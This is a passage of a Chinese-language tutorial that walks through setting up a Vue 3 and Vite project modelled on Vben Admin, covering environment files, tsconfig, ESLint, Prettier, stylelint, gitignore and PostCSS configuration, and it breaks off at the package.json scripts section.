.env.[mode].local # 只在指定的模式中被載入，但會被 git 忽略 創建默認配置文件 根目錄下創建：.env文件 1 2 3 4 5 6 7 8 # 運行的端口 VITE_PORT = 3100 # 應用名稱 VITE_GLOB_APP_TITLE = Vben Admin # 應用短名稱 VITE_GLOB_APP_SHORT_NAME = vue_vben_admin 創建生產配置文件 根目錄下創建：.env.production文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # 是否使用mock VITE_USE_MOCK = true # 公共路徑 VITE_PUBLIC_PATH = / # 是否刪除所有日誌打印 VITE_DROP_CONSOLE = true # 是否啟用gzip或brotli壓縮。 # 可選：gzip | brotli | none # 如果你需要多個表格，你可以使用`,`來分隔。 VITE_BUILD_COMPRESS = \u0026#39;none\u0026#39; # 應用基本接口地址 VITE_GLOB_API_URL=/api # 文件上傳地址，可選 # 可以通過nginx轉發或直接寫入實際地址。 VITE_GLOB_UPLOAD_URL=/upload # 接口前綴 VITE_GLOB_API_URL_PREFIX= # 是否啟用圖像壓縮 VITE_USE_IMAGEMIN= true #使用PWA VITE_USE_PWA = false # 是否與舊版瀏覽器兼容 VITE_LEGACY = false 創建開發配置文件 根目錄下創建：.env.development文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 VITE_PORT = 3100 # 是否使用mock VITE_USE_MOCK = true # 公共路徑 VITE_PUBLIC_PATH = / # 跨域代理，你可以配置多個代理。 VITE_PROXY=[[\u0026#34;/api\u0026#34;,\u0026#34;http://localhost:3000\u0026#34;],[\u0026#34;/upload\u0026#34;,\u0026#34;http://localhost:3001/upload\u0026#34;]] # VITE_PROXY=[[\u0026#34;/api\u0026#34;,\u0026#34;https://vvbin.cn/test\u0026#34;]] # 是否刪除所有日誌打印 VITE_DROP_CONSOLE = false # 應用基本接口地址 VITE_GLOB_API_URL=/api # 文件上傳地址，可選 VITE_GLOB_UPLOAD_URL=/upload # 接口前綴 VITE_GLOB_API_URL_PREFIX= 測試配置 src\\App.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt;{{ vitePort }}\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { defineComponent, ref } from \u0026#34;vue\u0026#34;; export default defineComponent({ name: \u0026#34;App\u0026#34;, setup() { const vitePort = ref(import.meta.env.VITE_PORT); return { vitePort, }; }, }); \u0026lt;/script\u0026gt; 生產環境動態配置，可參考 Vben Admin 官方說明\n配置TS 說明 我們使用Vite創建的項目時使用的是vue-ts模板，所以在創建項目的時候package.json就自帶了typescript。該依賴會編譯我們的ts文件。那麼是依賴我們就可以配置它。配置內容還是照搬Vben的，加上註釋和規則來源。\n官方文檔-tsconfig.json文件 官方文檔-TS編譯選項 你不知道的 tsconfig.json 參考鏈接 創建配置文件 根目錄下創建：tsconfig.json文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 { \u0026#34;compilerOptions\u0026#34;: { // ↓ 指定ECMAScript目標版本，esnext為最新版本 \u0026#34;target\u0026#34;: \u0026#34;esnext\u0026#34;, // ↓ 指定生成哪個模塊系統代碼，esnext為最新版本 \u0026#34;module\u0026#34;: \u0026#34;esnext\u0026#34;, // ↓ 決定如何處理模塊。 \u0026#34;moduleResolution\u0026#34;: \u0026#34;node\u0026#34;, // ↓ 啟用所有嚴格類型檢查選項。 \u0026#34;strict\u0026#34;: true, // ↓ 禁止對同一個文件的不一致的引用。 \u0026#34;forceConsistentCasingInFileNames\u0026#34;: true, // ↓ 允許從沒有設置默認導出的模塊中默認導入。這並不影響代碼的輸出，僅為了類型檢查。 \u0026#34;allowSyntheticDefaultImports\u0026#34;: true, // ↓ 禁用函數參數雙向協變檢查。 \u0026#34;strictFunctionTypes\u0026#34;: false, // ↓ 在 .tsx文件裡支持JSX \u0026#34;jsx\u0026#34;: \u0026#34;preserve\u0026#34;, // ↓ 解析非相對模塊名的基準目錄。查看 模塊解析文檔了解詳情。 \u0026#34;baseUrl\u0026#34;: \u0026#34;.\u0026#34;, // ↓ 允許編譯javascript文件。 \u0026#34;allowJs\u0026#34;: true, // ↓ 生成相應的 .map文件。 \u0026#34;sourceMap\u0026#34;: true, \u0026#34;esModuleInterop\u0026#34;: true, \u0026#34;resolveJsonModule\u0026#34;: true, // ↓ 若有未使用的局部變量則拋錯。 \u0026#34;noUnusedLocals\u0026#34;: true, // ↓ 若有未使用的參數則拋錯。 \u0026#34;noUnusedParameters\u0026#34;: true, // ↓ 啟用實驗性的ES裝飾器。 \u0026#34;experimentalDecorators\u0026#34;: true, // ↓ 編譯過程中需要引入的庫文件的列表。 \u0026#34;lib\u0026#34;: [\u0026#34;dom\u0026#34;, \u0026#34;esnext\u0026#34;], // ↓ 要包含的類型聲明文件名列表。 \u0026#34;types\u0026#34;: [\u0026#34;vite/client\u0026#34;], // ↓ 要包含的類型聲明文件路徑列表。 \u0026#34;typeRoots\u0026#34;: [\u0026#34;./node_modules/@types/\u0026#34;, \u0026#34;./types\u0026#34;], \u0026#34;incremental\u0026#34;: true, // ↓ 在表達式和聲明上有隱含的 any類型時報錯。 \u0026#34;noImplicitAny\u0026#34;: false, // ↓ 忽略所有的聲明文件（ *.d.ts）的類型檢查。 \u0026#34;skipLibCheck\u0026#34;: true, // ↓ 模塊名到基於 baseUrl的路徑映射的列表。查看 模塊解析文檔了解詳情。 \u0026#34;paths\u0026#34;: { \u0026#34;/@/*\u0026#34;: [\u0026#34;src/*\u0026#34;], \u0026#34;/#/*\u0026#34;: [\u0026#34;types/*\u0026#34;] } }, // ↓ 指定一個匹配列表（屬於自動指定該路徑下的所有ts相關文件） \u0026#34;include\u0026#34;: [ \u0026#34;src/**/*.ts\u0026#34;, \u0026#34;src/**/*.d.ts\u0026#34;, \u0026#34;src/**/*.tsx\u0026#34;, \u0026#34;src/**/*.vue\u0026#34;, \u0026#34;types/**/*.d.ts\u0026#34;, \u0026#34;types/**/*.ts\u0026#34;, \u0026#34;mock/**/*.ts\u0026#34; ], // ↓ 指定一個排除列表（include的反向操作） \u0026#34;exclude\u0026#34;: [\u0026#34;node_modules\u0026#34;, \u0026#34;dist\u0026#34;, \u0026#34;**/*.js\u0026#34;] } 這裡配置完ESLint之後會報錯，說找不到vite/client。不用管它，當你執行完後面的ESLint-TS的時候就不會報錯了。\n安裝 ESLint 說明 ESLint簡單的來說就是去判斷你的JS代碼寫的格式對不對的一個依賴。沒有它你的代碼也能運行，有了它你的代碼可以寫的更漂亮。 ESLint還支持插件，第三方框架會基於ESLint寫出自己的代碼檢查插件。比如Vue3對應eslint-plugin-vue。\nESLint官網 ESLint-快速入門 配置ESLint ESLint的配置規則 安裝 ESLint 1 yarn add eslint --dev 配置ESLint：根目錄下創建：.eslintrc.js文件。 這裡可以使用eslint的init。但是我不清楚Vben的初始化操作是怎麼選的，所以直接拷貝Vben的配置。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 module.exports = { // ↓ 默認情況下，ESLint 會在所有父級目錄裡尋找配置文件，一直到根目錄。如果你想要你所有項目都遵循一個特定的約定時，這將會很有用，但有時候會導致意想不到的結果。為了將 ESLint 限製到一個特定的項目，在你項目根目錄下的 package.json 文件或者 .eslintrc.* 文件裡的 eslintConfig 字段下設置 \u0026#34;root\u0026#34;: true。 ESLint 一旦發現配置文件中有 \u0026#34;root\u0026#34;: true，它就會停止在父級目錄中尋找。 // ↓ 此項是用來告訴eslint找當前配置文件不能往父級查找 root: true, // ↓ 指定你想啟用的環境 env: { browser: true, node: true, es6: true, }, // ↓ 設置解析器 parser: \u0026#34;\u0026#34;, // ↓ 解析器選項 parserOptions: {}, // ↓ 擴展項 extends: [], // ↓ 自定義規則配置 rules: {} } 配置ESLint忽略文件：根目錄下創建：.eslintignore文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 *.sh node_modules *.md *.woff *.ttf .vscode .idea dist /public /docs .husky .local /bin Dockerfile 安裝 eslint-plugin-vue 說明 ESLint是檢查JS代碼的依賴，那麼它怎麼去檢查Vue語法的文件呢？要完成這件事，我們就需要安裝vue官方開發的ESLint插件eslint-plugin-vue。這樣ESLint就知道該怎麼檢查vue的文件了。\neslint-plugin-vue的官方文檔 eslint-plugin-vue的npm首頁 vue eslint 升級_ESLint 的 parser 是個什麼東西 vue-eslint-parser的Git地址 怎麼理解eslint-plugin-vue和vue-eslint-parser的關係呢?\nESLint 會對我們的代碼進行校驗，而 parser 的作用是將我們寫的代碼轉換為 ESTree，ESLint 會對 ESTree 進行校驗。\nvue-eslint-parser文檔上說是vue的模板解析器。 vue-eslint-parser的文檔中強調\u0026lt;template\u0026gt;標籤中的內容進行檢查。\n那麼我的理解是vue-eslint-parser將vue文件轉換成ESTree。然後使用eslint-plugin-vue來檢查這個ESTree。查出的結果交給ESLint。\nvue-eslint-parser的官方說明：\nThis parser allows us to lint the \u0026lt;template\u0026gt; of .vue files. We can make mistakes easily on \u0026lt;template\u0026gt; if we use complex directives and expressions in the template. This parser and the rules of eslint-plugin-vue would catch some of the mistakes.\n這個解析器允許我們對.vue文件的\u0026lt;template\u0026gt;進行檢查。如果我們在模板中使用了複雜的指令和表達式，我們很容易在\u0026lt;template\u0026gt;上出錯。這個解析器和eslint-plugin-vue的規則可以發現一些錯誤。\n總之eslint-plugin-vue和vue-eslint-parser需要一起使用，而且官網也有標示怎麼操作。\n安裝兩個 npm 插件 1 yarn add eslint-plugin-vue vue-eslint-parser --dev 將插件配置進ESLint 配置ESLint：根目錄下修改：.eslintrc.js文件 .eslintrc.js 1 2 3 4 5 6 7 8 9 module.exports = { // ... parser: \u0026#39;vue-eslint-parser\u0026#39;, // ... extends: [ \u0026#39;plugin:vue/vue3-recommended\u0026#39;, ], // ... } 安裝 @typescript-eslint 說明 這裡同理需要安裝 @typescript-eslint/eslint-plugin 和 @typescript-eslint/parser。\nTS-ESLint規則 @typescript-eslint/eslint-plugin的npm首頁 @typescript-eslint/parser的npm首頁 安裝TS的Lint 1 yarn add @typescript-eslint/eslint-plugin @typescript-eslint/parser --dev 將插件配置進ESLint 配置ESLint：根目錄下修改：.eslintrc.js文件 .eslintrc.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 module.exports = { // ... parserOptions: { parser: \u0026#34;@typescript-eslint/parser\u0026#34;, ecmaVersion: 2020, sourceType: \u0026#34;module\u0026#34;, jsxPragma: \u0026#34;React\u0026#34;, ecmaFeatures: { jsx: true, tsx: true, }, }, extends: [\u0026#34;plugin:vue/vue3-recommended\u0026#34;, \u0026#34;plugin:@typescript-eslint/recommended\u0026#34;], // ... } 安裝 eslint-plugin-prettier 說明 prettier用來格式化代碼的。一般IDE都有prettier的插件，在保存的時候格式化代碼。那麼我們eslint-plugin-prettier就是通過JS來判斷代碼格式是否正確。 一般這很必要，因為不同的程序員有不同的IDE，不同的IDE有不同的prettier插件。但對於項目來說只有一個eslint-plugin-prettier。\n而eslint-plugin-prettier插件依賴於prettier依賴。那麼eslint-config-prettier插件又是幹嘛的？\nprettier和ESLint之間有些規則不一樣，因此是用於解決衝突得。eslint-config-prettier將prettier一些規則默認關閉了。\n使用ESLint+Prettier來統一前端代碼風格 prettier首頁 prettier的npm首頁 eslint-plugin-prettier的npm首頁 eslint-config-prettier的npm首頁 安裝 1 yarn add prettier eslint-plugin-prettier eslint-config-prettier --dev 配置prettier prettier的配置項\n根目錄下創建：prettier.config.js文件 prettier.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 module.exports = { printWidth: 100, tabWidth: 2, useTabs: false, semi: true, vueIndentScriptAndStyle: true, singleQuote: true, quoteProps: \u0026#39;as-needed\u0026#39;, bracketSpacing: true, trailingComma: \u0026#39;es5\u0026#39;, jsxBracketSameLine: false, jsxSingleQuote: false, arrowParens: \u0026#39;always\u0026#39;, insertPragma: false, requirePragma: false, proseWrap: \u0026#39;never\u0026#39;, htmlWhitespaceSensitivity: \u0026#39;strict\u0026#39;, endOfLine: \u0026#39;lf\u0026#39;, rangeStart: 0 } 配置prettier忽略文件 根目錄下創建：.prettierignore文件 .prettierignore 1 2 3 4 5 6 7 8 9 /dist/* .local .output.js /node_modules/** **/*.svg **/*.sh /public/* 配置進ESLint 配置ESLint：修改根目錄下：.eslintrc.js文件 .eslintrc.js 1 2 3 4 5 6 7 8 9 10 module.exports = { // ... extends: [ \u0026#34;plugin:vue/vue3-recommended\u0026#34;, \u0026#34;plugin:@typescript-eslint/recommended\u0026#34;, \u0026#34;prettier\u0026#34;, \u0026#34;plugin:prettier/recommended\u0026#34;, ], // ... } 自定義ESLint檢查規則 說明 ESLint是用來檢查代碼的。又安裝了那麼多的插件。但是官方默認的方案有時不一樣符合我們的要求。我們需要自定義自己的規則。\n修改規則主要是修改根目錄下.eslintrc.js文件的rules字段。\n修改規則 @typescript-eslint/ban-ts-ignore @typescript-eslint/explicit-function-return-type @typescript-eslint/no-explicit-any @typescript-eslint/no-var-requires @typescript-eslint/no-empty-function vue/custom-event-name-casing no-use-before-define @typescript-eslint/no-use-before-define @typescript-eslint/ban-ts-comment @typescript-eslint/ban-types @typescript-eslint/no-non-null-assertion @typescript-eslint/explicit-module-boundary-types @typescript-eslint/no-unused-vars no-unused-vars space-before-function-paren vue/attributes-order vue/one-component-per-file vue/html-closing-bracket-newline vue/max-attributes-per-line vue/multiline-html-element-content-newline singleline-html-element-content-newline vue/attribute-hyphenation vue/html-self-closing vue/require-default-prop 配置ESLint：根目錄下：.eslintrc.js文件 .eslintrc.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 module.exports = { // ... rules: { // ↓ 禁止使用@ts-ignore來消除ESLint檢查 \u0026#39;@typescript-eslint/ban-ts-ignore\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 在函數和類方法上需要顯式的返回類型 \u0026#39;@typescript-eslint/explicit-function-return-type\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 禁止使用any類型 \u0026#39;@typescript-eslint/no-explicit-any\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 除導入語句外，禁止使用require語句 \u0026#39;@typescript-eslint/no-var-requires\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 禁止使用空函數 \u0026#39;@typescript-eslint/no-empty-function\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 對自定義事件名稱強制使用特定的大小寫 \u0026#39;vue/custom-event-name-casing\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 禁止定義前使用 \u0026#39;no-use-before-define\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 在定義變量之前不允許使用變量 \u0026#39;@typescript-eslint/no-use-before-define\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 禁止使用@ts-註解 \u0026#39;@typescript-eslint/ban-ts-comment\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 禁止使用特定類型 \u0026#39;@typescript-eslint/ban-types\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 禁止使用!後綴運算符進行非null斷言 \u0026#39;@typescript-eslint/no-non-null-assertion\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 在導出的函數和類的公共類方法上需要顯式的返回值和參數類型 \u0026#39;@typescript-eslint/explicit-module-boundary-types\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 禁止使用未使用的變量 \u0026#39;@typescript-eslint/no-unused-vars\u0026#39;: [ \u0026#39;error\u0026#39;, { argsIgnorePattern: \u0026#39;^h$\u0026#39;, varsIgnorePattern: \u0026#39;^h$\u0026#39;, }, ], // ↓ 禁止使用未使用的變量 \u0026#39;no-unused-vars\u0026#39;: [ \u0026#39;error\u0026#39;, { argsIgnorePattern: \u0026#39;^h$\u0026#39;, varsIgnorePattern: \u0026#39;^h$\u0026#39;, }, ], // ↓ 在函數括號前需要或不允許有空格 \u0026#39;space-before-function-paren\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 強制屬性順序 \u0026#39;vue/attributes-order\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 強制每個組件應位於其自己的文件中 \u0026#39;vue/one-component-per-file\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 在標籤的右括號之前要求或不允許換行 \u0026#39;vue/html-closing-bracket-newline\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 強制每行的最大屬性數 \u0026#39;vue/max-attributes-per-line\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 在多行元素的內容之前和之後需要換行 \u0026#39;vue/multiline-html-element-content-newline\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 在單行元素的內容之前和之後需要換行 \u0026#39;vue/singleline-html-element-content-newline\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 在模板中的自定義組件上實施屬性命名樣式 \u0026#39;vue/attribute-hyphenation\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 需要道具的默認值 \u0026#39;vue/require-default-prop\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 實施自我封閉的風格 // \u0026#39;vue/html-self-closing\u0026#39;: \u0026#39;off\u0026#39;, \u0026#39;vue/html-self-closing\u0026#39;: [ \u0026#39;error\u0026#39;, { html: { void: \u0026#39;always\u0026#39;, normal: \u0026#39;never\u0026#39;, component: \u0026#39;always\u0026#39;, }, svg: \u0026#39;always\u0026#39;, math: \u0026#39;always\u0026#39; } ] } } vben項目配置git忽略文件 說明 這個應該是項目一上來就要處理的，但是我手撕Vben的時候，按照配置文件的順序下來，到現在才處理了。\n創建Git忽略文件 根目錄下創建：.gitignore文件 .gitignore 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 node_modules .DS_Store dist dist-ssr *.local # other .npmrc .cache test/upload-server/static .local # local env files .env.local .env.*.local # Log files npm-debug.log* yarn-debug.log* yarn-error.log* pnpm-debug.log* # Editor directories and files .idea # .vscode *.suo *.ntvs* *.njsproj *.sln *.sw? 安裝style-lint 說明 這次需要安裝四個插件stylelint、stylelint-config-standard、stylelint-config-prettier、stylelint-order。\nstylelint是對我們編寫的樣式進行檢查的插件。 stylelint-config-standard是stylelint擴展的檢查標準庫。 stylelint-config-prettier是用來解決衝突的（估計又和ESLint衝突了，參考之前的prettier）。 stylelint-order是檢查我們樣式編寫順序的。 參考連結 stylelint官網 stylelint的npm首頁 stylelint-config-standard的npm首頁：擴展，標準庫 stylelint-config-prettier的npm首頁：擴展，解決衝突的 stylelint-order的npm首頁：插件，樣式排序 stylelinit的配置說明 stylelint的配置規則 安裝 1 yarn add stylelint stylelint-config-standard stylelint-config-prettier stylelint-order --dev 配置stylelint 根目錄下創建：stylelint.config.js文件 stylelint.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 module.exports = { // ↓ 這個好像是沒有用的，但是VbenAdmin是這麼寫的 root: true, // ↓ 插件 plugins: [\u0026#39;stylelint-order\u0026#39;], // ↓ 擴展 extends: [\u0026#39;stylelint-config-standard\u0026#39;, \u0026#39;stylelint-config-prettier\u0026#39;], // ↓ 自定義規則 rules: {}, // ↓ 忽略檢查的文件 ignoreFiles: [\u0026#39;**/*.js\u0026#39;, \u0026#39;**/*.jsx\u0026#39;, \u0026#39;**/*.tsx\u0026#39;, \u0026#39;**/*.ts\u0026#39;] } 配置自定義樣式規則 根目錄下修改：stylelint.config.js文件 stylelint.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 module.exports = { // ... rules: { // ↓ 禁止使用未知的偽類選擇器。 \u0026#39;selector-pseudo-class-no-unknown\u0026#39;: [ true, { ignorePseudoClasses: [\u0026#39;global\u0026#39;] } ], // ↓ 禁止使用未知規則。 \u0026#39;at-rule-no-unknown\u0026#39;: [ true, { ignoreAtRules: [\u0026#39;function\u0026#39;, \u0026#39;if\u0026#39;, \u0026#39;each\u0026#39;, \u0026#39;include\u0026#39;, \u0026#39;mixin\u0026#39;] } ], // ↓ 禁止空來源。 \u0026#39;no-empty-source\u0026#39;: null, // ↓ 禁止使用無效的命名網格區域。 \u0026#39;named-grid-areas-no-invalid\u0026#39;: null, // ↓ 要求或不允許使用Unicode字節順序標記。 \u0026#39;unicode-bom\u0026#39;: \u0026#39;never\u0026#39;, // ↓ 禁止較低特異性的選擇器在覆蓋較高特異性的選擇器之後出現。 \u0026#39;no-descending-specificity\u0026#39;: null, // ↓ 禁止在字體系列名稱列表中缺少通用系列。 \u0026#39;font-family-no-missing-generic-family-keyword\u0026#39;: null, // ↓ 在聲明的冒號後面需要一個空格或禁止空格。 \u0026#39;declaration-colon-space-after\u0026#39;: \u0026#39;always-single-line\u0026#39;, // ↓ 在聲明的冒號之前需要一個空格或禁止使用空格。 \u0026#39;declaration-colon-space-before\u0026#39;: \u0026#39;never\u0026#39;, // ↓ 在聲明塊內要求或不允許尾隨分號。 \u0026#39;declaration-block-trailing-semicolon\u0026#39;: \u0026#39;always\u0026#39;, // ↓ 在規則之前要求或禁止使用空行。 \u0026#39;rule-empty-line-before\u0026#39;: [ \u0026#39;always\u0026#39;, { ignore: [\u0026#39;after-comment\u0026#39;, \u0026#39;first-nested\u0026#39;], } ], // ↓ 禁止使用未知單位。 \u0026#39;unit-no-unknown\u0026#39;: [true, { ignoreUnits: [\u0026#39;rpx\u0026#39;] }], // Specify the alphabetical order of the attributes in the declaration block // ↓ 樣式順序 \u0026#39;order/properties-order\u0026#39;: [ \u0026#39;position\u0026#39;, \u0026#39;top\u0026#39;, \u0026#39;right\u0026#39;, \u0026#39;bottom\u0026#39;, \u0026#39;left\u0026#39;, \u0026#39;z-index\u0026#39;, \u0026#39;display\u0026#39;, \u0026#39;float\u0026#39;, \u0026#39;width\u0026#39;, \u0026#39;height\u0026#39;, \u0026#39;max-width\u0026#39;, \u0026#39;max-height\u0026#39;, \u0026#39;min-width\u0026#39;, \u0026#39;min-height\u0026#39;, \u0026#39;padding\u0026#39;, \u0026#39;padding-top\u0026#39;, \u0026#39;padding-right\u0026#39;, \u0026#39;padding-bottom\u0026#39;, \u0026#39;padding-left\u0026#39;, \u0026#39;margin\u0026#39;, \u0026#39;margin-top\u0026#39;, \u0026#39;margin-right\u0026#39;, \u0026#39;margin-bottom\u0026#39;, \u0026#39;margin-left\u0026#39;, \u0026#39;margin-collapse\u0026#39;, \u0026#39;margin-top-collapse\u0026#39;, \u0026#39;margin-right-collapse\u0026#39;, \u0026#39;margin-bottom-collapse\u0026#39;, \u0026#39;margin-left-collapse\u0026#39;, \u0026#39;overflow\u0026#39;, \u0026#39;overflow-x\u0026#39;, \u0026#39;overflow-y\u0026#39;, \u0026#39;clip\u0026#39;, \u0026#39;clear\u0026#39;, \u0026#39;font\u0026#39;, \u0026#39;font-family\u0026#39;, \u0026#39;font-size\u0026#39;, \u0026#39;font-smoothing\u0026#39;, \u0026#39;osx-font-smoothing\u0026#39;, \u0026#39;font-style\u0026#39;, \u0026#39;font-weight\u0026#39;, \u0026#39;hyphens\u0026#39;, \u0026#39;src\u0026#39;, \u0026#39;line-height\u0026#39;, \u0026#39;letter-spacing\u0026#39;, \u0026#39;word-spacing\u0026#39;, \u0026#39;color\u0026#39;, \u0026#39;text-align\u0026#39;, \u0026#39;text-decoration\u0026#39;, \u0026#39;text-indent\u0026#39;, \u0026#39;text-overflow\u0026#39;, \u0026#39;text-rendering\u0026#39;, \u0026#39;text-size-adjust\u0026#39;, \u0026#39;text-shadow\u0026#39;, \u0026#39;text-transform\u0026#39;, \u0026#39;word-break\u0026#39;, \u0026#39;word-wrap\u0026#39;, \u0026#39;white-space\u0026#39;, \u0026#39;vertical-align\u0026#39;, \u0026#39;list-style\u0026#39;, \u0026#39;list-style-type\u0026#39;, \u0026#39;list-style-position\u0026#39;, \u0026#39;list-style-image\u0026#39;, \u0026#39;pointer-events\u0026#39;, \u0026#39;cursor\u0026#39;, \u0026#39;background\u0026#39;, \u0026#39;background-attachment\u0026#39;, \u0026#39;background-color\u0026#39;, \u0026#39;background-image\u0026#39;, \u0026#39;background-position\u0026#39;, \u0026#39;background-repeat\u0026#39;, \u0026#39;background-size\u0026#39;, \u0026#39;border\u0026#39;, \u0026#39;border-collapse\u0026#39;, \u0026#39;border-top\u0026#39;, \u0026#39;border-right\u0026#39;, \u0026#39;border-bottom\u0026#39;, \u0026#39;border-left\u0026#39;, \u0026#39;border-color\u0026#39;, \u0026#39;border-image\u0026#39;, \u0026#39;border-top-color\u0026#39;, \u0026#39;border-right-color\u0026#39;, \u0026#39;border-bottom-color\u0026#39;, \u0026#39;border-left-color\u0026#39;, \u0026#39;border-spacing\u0026#39;, \u0026#39;border-style\u0026#39;, \u0026#39;border-top-style\u0026#39;, \u0026#39;border-right-style\u0026#39;, \u0026#39;border-bottom-style\u0026#39;, \u0026#39;border-left-style\u0026#39;, \u0026#39;border-width\u0026#39;, \u0026#39;border-top-width\u0026#39;, \u0026#39;border-right-width\u0026#39;, \u0026#39;border-bottom-width\u0026#39;, \u0026#39;border-left-width\u0026#39;, \u0026#39;border-radius\u0026#39;, \u0026#39;border-top-right-radius\u0026#39;, \u0026#39;border-bottom-right-radius\u0026#39;, \u0026#39;border-bottom-left-radius\u0026#39;, \u0026#39;border-top-left-radius\u0026#39;, \u0026#39;border-radius-topright\u0026#39;, \u0026#39;border-radius-bottomright\u0026#39;, \u0026#39;border-radius-bottomleft\u0026#39;, \u0026#39;border-radius-topleft\u0026#39;, \u0026#39;content\u0026#39;, \u0026#39;quotes\u0026#39;, \u0026#39;outline\u0026#39;, \u0026#39;outline-offset\u0026#39;, \u0026#39;opacity\u0026#39;, \u0026#39;filter\u0026#39;, \u0026#39;visibility\u0026#39;, \u0026#39;size\u0026#39;, \u0026#39;zoom\u0026#39;, \u0026#39;transform\u0026#39;, \u0026#39;box-align\u0026#39;, \u0026#39;box-flex\u0026#39;, \u0026#39;box-orient\u0026#39;, \u0026#39;box-pack\u0026#39;, \u0026#39;box-shadow\u0026#39;, \u0026#39;box-sizing\u0026#39;, \u0026#39;table-layout\u0026#39;, \u0026#39;animation\u0026#39;, \u0026#39;animation-delay\u0026#39;, \u0026#39;animation-duration\u0026#39;, \u0026#39;animation-iteration-count\u0026#39;, \u0026#39;animation-name\u0026#39;, \u0026#39;animation-play-state\u0026#39;, \u0026#39;animation-timing-function\u0026#39;, \u0026#39;animation-fill-mode\u0026#39;, \u0026#39;transition\u0026#39;, \u0026#39;transition-delay\u0026#39;, \u0026#39;transition-duration\u0026#39;, \u0026#39;transition-property\u0026#39;, \u0026#39;transition-timing-function\u0026#39;, \u0026#39;background-clip\u0026#39;, \u0026#39;backface-visibility\u0026#39;, \u0026#39;resize\u0026#39;, \u0026#39;appearance\u0026#39;, \u0026#39;user-select\u0026#39;, \u0026#39;interpolation-mode\u0026#39;, \u0026#39;direction\u0026#39;, \u0026#39;marks\u0026#39;, \u0026#39;page\u0026#39;, \u0026#39;set-link-source\u0026#39;, \u0026#39;unicode-bidi\u0026#39;, \u0026#39;speak\u0026#39; ] } // ... } 配置stylelint忽略文件 根目錄下創建：.stylelintignore文件 .stylelintignore 1 2 /dist/* /public/* 配置Yarn自動清除功能 說明 實現每一次install之後、add之後、yarn autoclean --force之後。從程序包依賴項中清除並刪除不必要的文件。\n參考鏈接：yarn autoclean-官方說明\n初始化 1 yarn autoclean --init 執行完命令之後，Yarn就會自動在根目錄下創建一個.yarnclean文件，這樣就可以了。\n安裝PostCSS 說明 我們需要安裝兩個庫postcss、autoprefixer。要現實的效果就是我們編寫一般的樣式，渲染頁面的dom節點有面向各種瀏覽器廠商的樣式。\n網上說postcss類似一個平台，上面有很多插件，autoprefixer就其中一個。\n我以我的看法來解釋一下：postcss就像一個管子，autoprefixer是裡面的過濾器。你寫的css從管子中流過，經過他們的處理就出現了不同的結果。\n參考連結：\nVite配置PostCss postcss的官網 postcss的npm首頁 autoprefixer的npm首頁 知乎autoprefixer說明 安裝 1 yarn add postcss autoprefixer --dev 配置postcss 根目錄下：postcss.config.js postcss.config.js 1 2 3 4 5 module.exports = { plugins: { autoprefixer: {} } } 解析VbenAdmin中的script 說明 VbenAdmin官方文檔-npm Script\n一下腳本直接添加在根目錄下的package.json的scripts對象中即可。也可以直接照搬VbenAdmin的。\n以bootstrap為例。如下：\n1 2 3 yarn bootstrap # or # npm run bootstrap bootstrap 代碼：\npackage.json 1 2 3 4 5 